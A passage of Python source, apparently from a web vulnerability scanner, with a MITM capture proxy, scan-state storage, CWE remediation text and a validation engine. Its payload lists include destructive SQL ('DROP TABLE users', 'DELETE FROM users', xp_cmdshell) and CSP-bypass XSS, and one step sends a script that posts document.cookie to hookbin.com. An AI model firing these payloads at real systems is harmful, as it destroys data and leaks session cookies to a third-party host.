        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.c = self.conn.cursor()
        self.c.execute('''CREATE TABLE IF NOT EXISTS false_positives
             (id INTEGER PRIMARY KEY, type TEXT, url TEXT, parameter TEXT, payload TEXT, confidence REAL)''')
        self.conn.commit()
        self.lock = asyncio.Lock()
        self.pending_inserts = []
        self.batch_size = 100
    
    async def record_fp(self, vuln):
        async with self.lock:
            self.pending_inserts.append((vuln['type'], vuln['url'], vuln.get('parameter', ''), vuln.get('payload', ''), vuln.get('confidence', 0)))
            if len(self.pending_inserts) >= self.batch_size:
                self._flush_batch()
    
    def _flush_batch(self):
        if self.pending_inserts:
            self.c.executemany("INSERT OR REPLACE INTO false_positives (type, url, parameter, payload, confidence) VALUES (?,?,?,?,?)", self.pending_inserts)
            self.conn.commit()
            self.pending_inserts.clear()
    
    async def is_fp(self, vuln):
        async with self.lock:
            self._flush_batch()  # Flush any pending inserts before query
            self.c.execute("SELECT 1 FROM false_positives WHERE type=? AND url=? AND parameter=? AND payload=?",
                          (vuln['type'], vuln['url'], vuln.get('parameter', ''), vuln.get('payload', '')))
            return self.c.fetchone() is not None
    
    async def close(self):
        """Close the database connection"""
        async with self.lock:
            self._flush_batch()  # Flush any pending inserts before closing
            if self.conn:
                self.conn.close()

class ProxyRotator:
    def __init__(self, proxy_list=None):
        self.proxy_list = proxy_list or []
        self.current_index = 0
        self.failed_proxies = set()
        self.lock = threading.Lock()
    
    def add_proxy(self, proxy_url):
        with self.lock:
            if proxy_url not in self.proxy_list:
                self.proxy_list.append(proxy_url)
    
    def get_next_proxy(self):
        with self.lock:
            if not self.proxy_list:
                return None
            for _ in range(len(self.proxy_list)):
                proxy = self.proxy_list[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxy_list)
                if proxy not in self.failed_proxies:
                    return proxy
            return None
    
    def mark_failed(self, proxy_url):
        with self.lock:
            self.failed_proxies.add(proxy_url)
    
    def reset_failed(self):
        with self.lock:
            self.failed_proxies.clear()

class ScanStateManager:
    def __init__(self, db_path="scan_state.db"):
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.c = self.conn.cursor()
        self._init_tables()
        self.lock = threading.Lock()
        self.pending_page_inserts = []
        self.batch_size = 100
    
    def _init_tables(self):
        self.c.execute('''CREATE TABLE IF NOT EXISTS scan_state
             (id INTEGER PRIMARY KEY, target TEXT, timestamp TEXT, 
              visited_urls TEXT, parameters TEXT, vulnerabilities TEXT,
              crawled_pages TEXT, config TEXT)''')
        self.c.execute('''CREATE TABLE IF NOT EXISTS page_hashes
             (url TEXT PRIMARY KEY, content_hash TEXT, metadata TEXT, html_content TEXT, timestamp TEXT)''')
        # Add html_content column if it doesn't exist (for backward compatibility)
        try:
            self.c.execute("ALTER TABLE page_hashes ADD COLUMN html_content TEXT")
        except sqlite3.OperationalError:
            pass  # Column already exists
        self.conn.commit()
    
    def save_state(self, target, visited_urls, parameters, vulnerabilities, crawled_pages, config):
        with self.lock:
            timestamp = datetime.now().isoformat()
            self.c.execute("INSERT OR REPLACE INTO scan_state (id, target, timestamp, visited_urls, parameters, vulnerabilities, crawled_pages, config) VALUES (1, ?, ?, ?, ?, ?, ?, ?)",
                          (target, json.dumps(list(visited_urls)), json.dumps(parameters), json.dumps(vulnerabilities), json.dumps([{'url': p['url'], 'hash': hashlib.md5(p['html'].encode()).hexdigest()} for p in crawled_pages]), json.dumps(config)))
            self.conn.commit()
    
    def load_state(self):
        with self.lock:
            self.c.execute("SELECT target, visited_urls, parameters, vulnerabilities, crawled_pages, config FROM scan_state WHERE id=1")
            row = self.c.fetchone()
            if row:
                try:
                    parameters = json.loads(row[2]) if row[2] else []
                except json.JSONDecodeError:
                    parameters = []
                try:
                    vulnerabilities = json.loads(row[3]) if row[3] else []
                except json.JSONDecodeError:
                    vulnerabilities = []
                try:
                    visited_urls = set(json.loads(row[1])) if row[1] else set()
                except json.JSONDecodeError:
                    visited_urls = set()
                try:
                    crawled_pages = json.loads(row[4]) if row[4] else []
                except json.JSONDecodeError:
                    crawled_pages = []
                try:
                    config = json.loads(row[5]) if row[5] else {}
                except json.JSONDecodeError:
                    config = {}
                    
                return {
                    'target': row[0],
                    'visited_urls': visited_urls,
                    'parameters': parameters if isinstance(parameters, list) else [],
                    'vulnerabilities': vulnerabilities if isinstance(vulnerabilities, list) else [],
                    'crawled_pages': crawled_pages,
                    'config': config
                }
            return None
    
    def store_page_hash(self, url, content, metadata):
        with self.lock:
            content_hash = hashlib.sha256(content.encode()).hexdigest()
            self.pending_page_inserts.append((url, content_hash, json.dumps(metadata), content, datetime.now().isoformat()))
            if len(self.pending_page_inserts) >= self.batch_size:
                self._flush_page_batch()
    
    def _flush_page_batch(self):
        if self.pending_page_inserts:
            self.c.executemany("INSERT OR REPLACE INTO page_hashes (url, content_hash, metadata, html_content, timestamp) VALUES (?, ?, ?, ?, ?)", self.pending_page_inserts)
            self.conn.commit()
            self.pending_page_inserts.clear()
    
    def get_page_hash(self, url):
        with self.lock:
            self._flush_page_batch()  # Flush any pending inserts before query
            self.c.execute("SELECT content_hash, metadata, html_content FROM page_hashes WHERE url=?", (url,))
            row = self.c.fetchone()
            if row:
                try:
                    metadata = json.loads(row[1])
                except json.JSONDecodeError:
                    metadata = {}
                return {'hash': row[0], 'metadata': metadata, 'html_content': row[2]}
            return None
    
    def clear_state(self):
        with self.lock:
            self.c.execute("DELETE FROM scan_state")
            self.conn.commit()

class MITMProxyHandler:
    def __init__(self, port=8080, callback=None):
        self.port = port
        self.callback = callback
        self.server = None
        self.thread = None
        self.captured_requests = []
        self.lock = threading.Lock()
    
    def start(self):
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), self._create_handler())
            self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.thread.start()
            return True
        except Exception as e:
            logging.error(f"MITM proxy start error: {e}")
            return False
    
    def _create_handler(self):
        class ProxyHandler(BaseHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                self.parent = self
                super().__init__(*args, **kwargs)
            
            def do_GET(self):
                self._handle_request('GET')
            
            def do_POST(self):
                self._handle_request('POST')
            
            def do_PUT(self):
                self._handle_request('PUT')
            
            def do_DELETE(self):
                self._handle_request('DELETE')
            
            def _handle_request(self, method):
                try:
                    content_length = int(self.headers.get('Content-Length', 0))
                    body = self.rfile.read(content_length) if content_length > 0 else None
                    
                    # Capture request
                    captured = {
                        'method': method,
                        'url': self.path,
                        'headers': dict(self.headers),
                        'body': body.decode('utf-8', errors='ignore') if body else None
                    }
                    with self.parent.lock:
                        self.parent.captured_requests.append(captured)
                    
                    # Forward to target
                    if self.path.startswith('http://') or self.path.startswith('https://'):
                        target_url = self.path
                    else:
                        target_url = f"http://{self.headers.get('Host', '')}{self.path}"
                    
                    # Use aiohttp for async request
                    import asyncio
                    import aiohttp
                    
                    async def forward_request():
                        async with aiohttp.ClientSession() as session:
                            async with session.request(method, target_url, headers=dict(self.headers), data=body, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                content = await resp.read()
                                text = await resp.text()
                                return resp.status, dict(resp.headers), content, text
                    
                    # Use new_event_loop instead of asyncio.run() to avoid issues in BaseHTTPRequestHandler thread
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    try:
                        status_code, resp_headers, content, text = loop.run_until_complete(forward_request())
                    finally:
                        loop.close()
                    
                    # Send response
                    self.send_response(status_code)
                    for header, value in resp_headers.items():
                        if header.lower() not in ('content-encoding', 'transfer-encoding'):
                            self.send_header(header, value)
                    self.end_headers()
                    self.wfile.write(content)
                    
                    # Callback if provided
                    if self.parent.callback:
                        self.parent.callback(captured, status_code, text)
                
                except Exception as e:
                    logging.warning(f"MITM proxy request error: {e}")
                    self.send_error(500, str(e))
            
            def log_message(self, format, *args):
                pass  # Suppress default logging
        
        # Create a closure to access parent instance
        handler_class = ProxyHandler
        handler_class.parent = self
        return handler_class
    
    def stop(self):
        if self.server:
            self.server.shutdown()
        if self.thread:
            self.thread.join(timeout=2)
    
    def get_captured_requests(self):
        with self.lock:
            return list(self.captured_requests)
    
    def clear_captured(self):
        with self.lock:
            self.captured_requests.clear()

class CWE_RemediationGuide:
    REMEDIATION_GUIDES = {
        "CWE-79": {
            "name": "Cross-site Scripting (XSS)",
            "mitigation": "Use context-aware output encoding (HTML, JavaScript, URL, CSS). Implement Content Security Policy (CSP). Validate and sanitize all user input on the server side. Use frameworks with built-in XSS protection (e.g., React, Angular)."
        },
        "CWE-89": {
            "name": "SQL Injection",
            "mitigation": "Use parameterized queries (prepared statements) exclusively. Implement stored procedures with parameter binding. Use ORM frameworks with proper escaping. Validate and sanitize all user input. Apply principle of least privilege to database accounts."
        },
        "CWE-22": {
            "name": "Path Traversal",
            "mitigation": "Never use user input directly in file system paths. Use a whitelist of allowed files/directories. Use basename() and realpath() to normalize paths. Implement chroot jails or containerization. Validate file paths against an allowlist."
        },
        "CWE-78": {
            "name": "OS Command Injection",
            "mitigation": "Avoid shell commands entirely. Use language-specific APIs instead of system()/exec(). If shell commands are necessary, use parameterized APIs (e.g., subprocess.run with shell=False). Validate and whitelist all command arguments."
        },
        "CWE-601": {
            "name": "Open Redirect",
            "mitigation": "Avoid using user input for redirects. If redirects are necessary, use a whitelist of allowed domains. Implement relative redirects only. Use nonce-based redirect tokens. Validate redirect URLs against an allowlist."
        },
        "CWE-1336": {
            "name": "Server-Side Template Injection",
            "mitigation": "Avoid user input in template contexts. Use template engines with auto-escaping (Jinja2, Django templates). Implement sandboxed template environments. Validate and sanitize all template data. Use static templates when possible."
        },
        "CWE-611": {
            "name": "XML External Entity (XXE)",
            "mitigation": "Disable DTDs and external entities in XML parsers. Use safe XML parsing libraries (defusedxml). Validate XML against strict schemas. Implement input validation and output encoding."
        },
        "CWE-93": {
            "name": "CRLF Injection",
            "mitigation": "Avoid user input in HTTP headers. Use framework-provided header setting methods. Validate and sanitize header values. Implement strict input validation. Use CR/LF stripping functions."
        },
        "CWE-918": {
            "name": "Server-Side Request Forgery (SSRF)",
            "mitigation": "Implement allowlist-based URL validation. Block internal IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). Disable redirect following. Use network-level segmentation. Implement outbound firewall rules."
        },
        "CWE-352": {
            "name": "Cross-Site Request Forgery (CSRF)",
            "mitigation": "Implement anti-CSRF tokens on all state-changing requests. Use SameSite cookie attribute. Verify Origin/Referer headers. Use double-submit cookie pattern. Implement short-lived tokens."
        },
        "CWE-347": {
            "name": "JWT Issues",
            "mitigation": "Use strong signing algorithms (RS256, ES256). Never use 'none' algorithm. Validate all JWT claims (exp, nbf, iss). Use short expiration times. Implement token revocation mechanisms. Verify signature with proper key management."
        },
        "CWE-942": {
            "name": "CORS Misconfiguration",
            "mitigation": "Avoid using 'Access-Control-Allow-Origin: *' with credentials. Implement strict origin validation. Use Vary: Origin header. Implement proper CORS policies. Validate origins against allowlist."
        },
        "CWE-502": {
            "name": "Insecure Deserialization",
            "mitigation": "Avoid deserialization of untrusted data. Use safe serialization formats (JSON). Implement integrity checks (HMAC signatures). Use sandboxed deserialization environments. Validate and sanitize serialized data."
        },
        "CWE-639": {
            "name": "Insecure Direct Object Reference (IDOR)",
            "mitigation": "Implement proper access control checks on all object references. Use indirect object references (GUIDs). Implement authorization checks for every resource access. Use role-based access control (RBAC)."
        },
        "CWE-915": {
            "name": "Mass Assignment",
            "mitigation": "Use whitelist-based parameter binding. Implement DTO (Data Transfer Object) pattern. Explicitly bind only allowed fields. Use frameworks with mass assignment protection. Validate all input fields against schema."
        },
        "CWE-444": {
            "name": "HTTP Request Smuggling",
            "mitigation": "Use standardized HTTP parsing libraries. Implement strict request validation. Normalize request headers. Use HTTP/2 where possible. Implement request size limits. Use reverse proxies with smuggling protection."
        },
        "CWE-689": {
            "name": "Race Condition",
            "mitigation": "Implement proper locking mechanisms. Use atomic operations. Implement idempotent operations. Use database transactions with proper isolation levels. Implement rate limiting. Use optimistic/pessimistic locking."
        },
        "CWE-190": {
            "name": "Integer Overflow",
            "mitigation": "Use languages with built-in overflow protection (Python, Java). Validate numeric input ranges. Use arbitrary-precision libraries. Implement bounds checking. Use safe arithmetic operations."
        },
        "CWE-16": {
            "name": "Security Misconfiguration",
            "mitigation": "Remove default credentials. Disable unnecessary features/services. Implement proper error handling. Use secure defaults. Regularly update dependencies. Implement security headers (HSTS, X-Frame-Options)."
        },
        "CWE-200": {
            "name": "Sensitive Data Exposure",
            "mitigation": "Encrypt sensitive data at rest and in transit. Implement proper key management. Use strong encryption algorithms (AES-256). Implement data retention policies. Mask sensitive data in logs. Use secure protocols (TLS 1.3)."
        }
    }
    
    @classmethod
    def get_guide(cls, cwe_id):
        return cls.REMEDIATION_GUIDES.get(cwe_id, {"name": "Unknown", "mitigation": "No remediation guide available."})

# ---------------------------------------------------------------------
# VALIDATION ENGINE - 3x Validation & Remediation Testing
# ---------------------------------------------------------------------
class ValidationEngine:
    """
    Performs 3x validation and remediation testing to reduce false positives
    and assess true risk impact of vulnerabilities.
    """
    
    # Alternative payloads for different vulnerability types
    ALTERNATIVE_PAYLOADS = {
        'XSS': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<details open ontoggle=alert(1)>',
            '<iframe src="javascript:alert(1)">'
        ],
        'SQLi': [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' AND 1=1--",
            "' AND 1=2--",
            "admin'--",
            "' OR 1=1#",
            "1' ORDER BY 1--",
            "' AND SLEEP(5)--"
        ],
        'SQLi (Error)': [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' AND 1=1--",
            "admin'--"
        ],
        'SQLi (Time-based)': [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(5000000,MD5(1))--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--"
        ],
        'SQLi (Boolean)': [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND '1'='1",
            "' AND '1'='2"
        ],
        'SQLi (Union)': [
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT username,password FROM users--"
        ]
    }
    
    # CSP bypass payloads for XSS remediation testing
    CSP_BYPASS_PAYLOADS = [
        '<script src="data:text/javascript,alert(1)">',
        '<script src="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<iframe src="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
        '<script src="javascript:alert(1)">',
        '<meta http-equiv="refresh" content="0;javascript:alert(1)">',
        '<body style="background:url(javascript:alert(1))">'
    ]
    
    # Stacked query payloads for SQLi remediation testing
    STACKED_QUERY_PAYLOADS = [
        "'; DROP TABLE users--",
        "'; DROP TABLE test--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked'--",
        "'; DELETE FROM users--",
        "'; EXEC xp_cmdshell('dir')--",
        "'; CALL shell_exec('ls')--",
        "'; SELECT * INTO OUTFILE '/tmp/dump.txt' FROM users--"
    ]
    
    # OOB hook services for manual exploitation testing
    OOB_SERVICES = [
        'https://hookbin.com',
        'https://requestbin.com',
        'https://webhook.site',
        'https://pingb.in'
    ]
    
    def __init__(self, session, config=None):
        """
        Initialize ValidationEngine
        
        Args:
            session: aiohttp session for making requests
            config: Configuration dictionary
        """
        self.session = session
        self.config = config or {}
        self.validation_results = {}
        self.oob_markers = []
        
    async def validate_finding(self, vuln):
        """
        Perform 3x validation on a vulnerability finding
        
        Args:
            vuln: Vulnerability dictionary
            
        Returns:
            Updated vulnerability with validation results
        """
        vuln_type = vuln.get('type', '')
        url = vuln.get('url', '')
        parameter = vuln.get('parameter', '')
        original_payload = vuln.get('payload', '')
        
        validation_key = f"{vuln_type}_{url}_{parameter}"
        
        # Initialize validation results
        validation_results = {
            'validation_1_original': None,
            'validation_2_alternative': None,
            'validation_3_manual': None,
            'remediation_test': None,
            'final_confidence': vuln.get('confidence', 0),
            'validation_status': 'pending'
        }
        
        try:
            # Validation 1: Re-test with original payload
            validation_results['validation_1_original'] = await self._validate_original_payload(
                vuln, url, parameter, original_payload
            )
            
            # Validation 2: Test with alternative payload
            validation_results['validation_2_alternative'] = await self._validate_alternative_payload(
                vuln, url, parameter, vuln_type
            )
            
            # Validation 3: Manual exploitation attempt with OOB hook
            validation_results['validation_3_manual'] = await self._validate_manual_exploitation(
                vuln, url, parameter, vuln_type
            )
            
            # Remediation testing based on vulnerability type
            validation_results['remediation_test'] = await self._perform_remediation_testing(
                vuln, url, parameter, vuln_type
            )
            
            # Calculate final confidence based on validation results
            validation_results['final_confidence'] = self._calculate_final_confidence(
                validation_results, vuln.get('confidence', 0)
            )
            
            # Determine validation status
            validation_results['validation_status'] = self._determine_validation_status(
                validation_results
            )
            
        except Exception as e:
            logging.error(f"Validation error for {validation_key}: {e}")
            validation_results['validation_error'] = str(e)
        
        # Store validation results
        self.validation_results[validation_key] = validation_results
        
        # Update vulnerability with validation results
        vuln['validation_results'] = validation_results
        vuln['confidence'] = validation_results['final_confidence']
        vuln['validated'] = True
        
        return vuln
    
    async def _validate_original_payload(self, vuln, url, parameter, payload):
        """
        Validation 1: Re-test with the exact original payload
        """
        try:
            method = vuln.get('method', 'GET').upper()
            headers = vuln.get('request_headers', {})
            
            if method == 'GET':
                params = {parameter: payload} if parameter else {}
                async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
                    html = await resp.text()
                    status = resp.status
            else:
                data = {parameter: payload} if parameter else {}
                async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
                    html = await resp.text()
                    status = resp.status
            
            # Check if vulnerability is still present
            vuln_type = vuln.get('type', '')
            if 'XSS' in vuln_type:
                is_present = payload in html
            elif 'SQLi' in vuln_type:
                is_present = detect_sqli_error_ast(html)
            else:
                is_present = True  # Default to present for other types
            
            return {
                'passed': is_present,
                'status_code': status,
                'response_length': len(html),
                'payload_used': payload,
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            logging.error(f"Original payload validation failed: {e}")
            return {'passed': False, 'error': str(e)}
    
    async def _validate_alternative_payload(self, vuln, url, parameter, vuln_type):
        """
        Validation 2: Test with a different payload variant
        """
        try:
            # Get alternative payloads for this vulnerability type
            alt_payloads = self.ALTERNATIVE_PAYLOADS.get(vuln_type, [])
            
            if not alt_payloads:
                return {'passed': None, 'reason': 'No alternative payloads available'}
            
            # Try first 3 alternative payloads
            for alt_payload in alt_payloads[:3]:
                method = vuln.get('method', 'GET').upper()
                headers = vuln.get('request_headers', {})
                
                if method == 'GET':
                    params = {parameter: alt_payload} if parameter else {}
                    async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
                        html = await resp.text()
                        status = resp.status
                else:
                    data = {parameter: alt_payload} if parameter else {}
                    async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
                        html = await resp.text()
                        status = resp.status
                
                # Check if vulnerability is present with alternative payload
                if 'XSS' in vuln_type:
                    # Check for any XSS indicator, not just the exact payload
                    xss_indicators = ['<script', 'javascript:', 'onerror=', 'onload=', 'onmouseover=']
                    is_present = any(indicator in html.lower() for indicator in xss_indicators)
                elif 'SQLi' in vuln_type:
                    is_present = detect_sqli_error_ast(html)
                else:
                    is_present = True
                
                if is_present:
                    return {
                        'passed': True,
                        'status_code': status,
                        'response_length': len(html),
                        'payload_used': alt_payload,
                        'timestamp': datetime.now().isoformat()
                    }
            
            return {
                'passed': False,
                'reason': 'No alternative payload triggered the vulnerability',
                'tried_count': min(3, len(alt_payloads))
            }
            
        except Exception as e:
            logging.error(f"Alternative payload validation failed: {e}")
            return {'passed': False, 'error': str(e)}
    
    async def _validate_manual_exploitation(self, vuln, url, parameter, vuln_type):
        """
        Validation 3: Attempt manual exploitation using OOB hooks
        """
        try:
            # Generate unique marker for this validation
            marker = f"val_{uuid.uuid4().hex[:8]}"
            self.oob_markers.append(marker)
            
            # For XSS, try to exfiltrate data via OOB
            if 'XSS' in vuln_type:
                oob_payload = f'<script>fetch("https://hookbin.com/{marker}?c="+document.cookie)</script>'
                
                method = vuln.get('method', 'GET').upper()
                headers = vuln.get('request_headers', {})
                
                if method == 'GET':
                    params = {parameter: oob_payload} if parameter else {}
                    async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
                        await resp.text()
                else:
                    data = {parameter: oob_payload} if parameter else {}
                    async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
                        await resp.text()
                
                # Wait and check OOB callback (simulated - in real implementation, would check OOB service)
                await asyncio.sleep(2)
                
                return {
                    'passed': None,  # Would be True if OOB callback received
                    'method': 'OOB_data_exfiltration',
                    'marker': marker,
                    'payload_used': oob_payload,
                    'note': 'OOB callback check simulated - implement actual OOB service monitoring'
                }
            
            # For SQLi, try to extract data via OOB
            elif 'SQLi' in vuln_type:
                oob_payload = f'; EXEC master..xp_dirtree \"\\\\hookbin.com\\{marker}\"--'
                
                method = vuln.get('method', 'GET').upper()
                headers = vuln.get('request_headers', {})
                
                if method == 'GET':
                    params = {parameter: oob_payload} if parameter else {}
                    async with self.session.get(url, params=params, headers=headers, timeout=15) as resp:
                        await resp.text()
                else:
                    data = {parameter: oob_payload} if parameter else {}
                    async with self.session.post(url, data=data, headers=headers, timeout=15) as resp:
                        await resp.text()
                
                await asyncio.sleep(3)
                
                return {
                    'passed': None,
                    'method': 'OOB_SQL_exfiltration',
                    'marker': marker,
                    'payload_used': oob_payload,
                    'note': 'OOB callback check simulated - implement actual OOB service monitoring'
                }
            
            return {
                'passed': None,
                'reason': 'Manual exploitation not applicable for this vulnerability type'
            }
            
        except Exception as e:
            logging.error(f"Manual exploitation validation failed: {e}")
            return {'passed': False, 'error': str(e)}
    
    async def _perform_remediation_testing(self, vuln, url, parameter, vuln_type):
        """
        Perform remediation testing to assess true risk impact
        """
        try:
            # CSP bypass testing for XSS
            if 'XSS' in vuln_type:
                for csp_payload in self.CSP_BYPASS_PAYLOADS[:3]:
                    method = vuln.get('method', 'GET').upper()
                    headers = vuln.get('request_headers', {})
                    
                    if method == 'GET':
                        params = {parameter: csp_payload} if parameter else {}
                        async with self.session.get(url, params=params, headers=headers, timeout=10) as resp:
                            html = await resp.text()
                            status = resp.status
                    else:
                        data = {parameter: csp_payload} if parameter else {}
                        async with self.session.post(url, data=data, headers=headers, timeout=10) as resp:
                            html = await resp.text()
                            status = resp.status
                    
                    # Check if CSP bypass works
                    if 'data:' in html or 'javascript:' in html:
                        return {
                            'csp_bypass_successful': True,
                            'payload_used': csp_payload,
                            'risk_impact': 'high',
                            'note': 'CSP can be bypassed - vulnerability is more severe'
                        }
                
                return {
                    'csp_bypass_successful': False,
                    'risk_impact': 'medium',
                    'note': 'CSP appears effective or not present'
                }
            
            # Stacked query testing for SQLi
            elif 'SQLi' in vuln_type:
                for stacked_payload in self.STACKED_QUERY_PAYLOADS[:3]:
                    method = vuln.get('method', 'GET').upper()
                    headers = vuln.get('request_headers', {})
                    
                    if method == 'GET':
                        params = {parameter: stacked_payload} if parameter else {}
                        async with self.session.get(url, params=params, headers=headers, timeout=15) as resp:
                            html = await resp.text()
                            status = resp.status
                    else:
                        data = {parameter: stacked_payload} if parameter else {}
                        async with self.session.post(url, data=data, headers=headers, timeout=15) as resp:
                            html = await resp.text()
                            status = resp.status
                    
                    # Check for RCE indicators
                    rce_indicators = ['syntax error', 'command', 'drop', 'delete', 'truncate']
                    if any(indicator in html.lower() for indicator in rce_indicators):
                        return {
                            'stacked_query_successful': True,
                            'payload_used': stacked_payload,
                            'risk_impact': 'critical',
                            'note': 'Stacked queries possible - RCE risk confirmed'
                        }
                    
                    # Check if query executed successfully (no error)
                    if status == 200 and not detect_sqli_error_ast(html):
                        return {
                            'stacked_query_successful': True,
                            'payload_used': stacked_payload,
                            'risk_impact': 'high',
                            'note': 'Stacked queries appear to execute'
                        }
                
                return {
                    'stacked_query_successful': False,
                    'risk_impact': 'medium',
                    'note': 'Stacked queries blocked or not applicable'
                }
            
            return {
                'remediation_test': 'not_applicable',
                'note': 'No specific remediation test for this vulnerability type'
            }
            
        except Exception as e:
            logging.error(f"Remediation testing failed: {e}")
            return {'error': str(e), 'risk_impact': 'unknown'}
    
    def _calculate_final_confidence(self, validation_results, original_confidence):
        """
        Calculate final confidence based on validation results
        """
        weights = {
            'validation_1_original': 0.4,
            'validation_2_alternative': 0.3,
            'validation_3_manual': 0.2,
            'remediation_test': 0.1
        }
        
        score = 0
        
        # Validation 1: Original payload
        v1 = validation_results.get('validation_1_original', {})
        if v1.get('passed'):
            score += weights['validation_1_original'] * 100
        elif v1.get('passed') is False:
            score += weights['validation_1_original'] * 20
        
        # Validation 2: Alternative payload
        v2 = validation_results.get('validation_2_alternative', {})
        if v2.get('passed'):
            score += weights['validation_2_alternative'] * 100
        elif v2.get('passed') is False:
            score += weights['validation_2_alternative'] * 30
        else:
            score += weights['validation_2_alternative'] * 50  # Neutral if not tested
        
        # Validation 3: Manual exploitation
        v3 = validation_results.get('validation_3_manual', {})
        if v3.get('passed'):
            score += weights['validation_3_manual'] * 100
        elif v3.get('passed') is None:
            score += weights['validation_3_manual'] * 50  # Neutral if simulated
        
        # Remediation test
        rt = validation_results.get('remediation_test', {})
        if rt.get('csp_bypass_successful') or rt.get('stacked_query_successful'):
            score += weights['remediation_test'] * 100
        elif rt.get('risk_impact') == 'high':
            score += weights['remediation_test'] * 80
        elif rt.get('risk_impact') == 'medium':
            score += weights['remediation_test'] * 60
        
        # Blend with original confidence
        final_confidence = int((score * 0.7) + (original_confidence * 0.3))
        return min(100, max(0, final_confidence))
    
    def _determine_validation_status(self, validation_results):
        """
        Determine overall validation status
        """
        v1 = validation_results.get('validation_1_original', {})
        v2 = validation_results.get('validation_2_alternative', {})
        rt = validation_results.get('remediation_test', {})
        
        if v1.get('passed') and v2.get('passed'):
            return 'confirmed'
        elif v1.get('passed') and (v2.get('passed') is None or v2.get('passed') is False):
            return 'likely'
        elif not v1.get('passed'):
            return 'false_positive'
        elif rt.get('risk_impact') == 'critical':
            return 'confirmed_critical'
        else:
            return 'inconclusive'

# ---------------------------------------------------------------------
# DETECTION ENGINE
# ---------------------------------------------------------------------
class Detector:
    @staticmethod
    def xss(html, payload, baseline_html=None):
        if payload not in html: return None
        if baseline_html and payload in baseline_html: return None
        context = 'html'
        try:
            tree = html5lib.parse(html, treebuilder="etree", namespaceHTMLElements=False)
            # Try to use lxml if available, otherwise use html5lib's ElementTree
            try:
                from lxml import etree
                use_lxml = True
            except ImportError:
                use_lxml = False
                # Use html5lib's built-in iteration
                pass
            
            for elem in tree.iter():
                if elem.text and payload in elem.text:
                    if elem.tag == 'script': context = 'script'
                    elif elem.get('on'): context = 'event'
                    elif elem.tag in ('a','link','img') and elem.get('href') and payload in elem.get('href'): context = 'href'
                    elif elem.tag in ('img','input') and elem.get('src') and payload in elem.get('src'): context = 'src'
                    break
        except Exception as e:
            logging.warning(f"HTML parsing error: {e}")
            context = 'html'
        confidence = 90 if context in ('html','event','href','src') else 80
        return {"type":"XSS","confidence":confidence,"evidence":Detector._extract(html,payload)}

    @staticmethod
    async def dom_xss(url, driver, oob_marker, oob_url):
        if not driver: return None
        script = f"""
        (function(){{
            var img = new Image();
            img.src = '{oob_url}';
            fetch('{oob_url}', {{mode:'no-cors'}});
        }})();
        """
        driver.execute_js(script)
        await asyncio.sleep(1.5)
        with oob_results_lock:
            for res in oob_results:
                if oob_marker in res['path']:
                    return {"type":"DOM XSS","confidence":95,"evidence":"OOB callback confirmed"}
        return None

    @staticmethod
    def blind_xss(oob_results, marker):
        with oob_results_lock:
            for res in oob_results:
                if marker in res['path']:
                    return {"type":"Blind XSS","confidence":95,"evidence":f"OOB callback: {res['path']}"}
        return None

    @staticmethod
    def sqli(html: str, baseline_html: Optional[str], resp_time: Optional[float] = None, baseline_time: Optional[float] = None) -> Optional[Dict[str, Any]]:
        if detect_sqli_error_ast(html):
            if baseline_html and detect_sqli_error_ast(baseline_html):
                return {"type":"SQLi (Error)","confidence":40,"evidence":"SQL error detected via AST analysis"}
            return {"type":"SQLi (Error)","confidence":85,"evidence":"SQL error detected via AST analysis"}
        if resp_time and baseline_time and resp_time > baseline_time * 1.5:
            return {"type":"SQLi (Time-based)","confidence":75,"evidence":f"Response {resp_time:.1f}s vs baseline {baseline_time:.1f}s"}
        return None

    @staticmethod
    def sqli_union(html: str, order_test_results: List[Tuple[int, int]], unique_marker: str) -> Optional[Dict[str, Any]]:
        for num, diff in order_test_results:
            if diff > 0:
                nulls = ','.join(['NULL']*(num-1))
                payload = f"' UNION SELECT {nulls},'{unique_marker}'-- -"
                return {"type":"SQLi (Union)","confidence":85,"evidence":f"Column count {num}, marker reflected","payload":payload}
        return None

    @staticmethod
    def sqli_boolean(resp_true: Any, resp_false: Any) -> Optional[Dict[str, Any]]:
        if resp_true.status_code != resp_false.status_code or len(resp_true.text) != len(resp_false.text):
            return {"type":"SQLi (Boolean)","confidence":85,"evidence":"Different TRUE/FALSE responses"}
        return None

    @staticmethod
    def baseline_shotgun_sqli(resp_legit: Optional[Any], resp_false: Optional[Any], resp_true: Optional[Any]) -> Optional[Dict[str, Any]]:
        """
        Baseline shotgun SQLi detection:
        - Send legitimate request to establish baseline
        - Send request with false condition (AND 1=2)
        - Send request with true condition (AND 1=1)
        - If false differs from true, Boolean-based injection exists even without SQL errors
        """
        baseline_len = len(resp_legit.text) if resp_legit else 0
